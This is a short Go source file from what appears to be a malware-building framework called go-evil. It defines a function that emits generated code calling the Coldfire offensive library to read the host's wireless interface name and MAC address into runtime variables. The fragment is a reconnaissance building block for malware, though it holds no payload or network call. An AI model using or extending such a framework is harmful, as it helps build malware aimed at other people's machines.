package network

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
)

// Grabs the current wireless interface
// Input None
// The result will be the interface name and mac adress which are placed into seperate runtime variables
func get_interface(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "get_interface"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),
		"i_name, i_mac := coldfire.Iface()",
		"spine.variable.set(i_name)",
		"spine.variable.set(i_mac)",
		"}"})
	data_object.Add_go_import("github.com/redcode-labs/Coldfire")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}
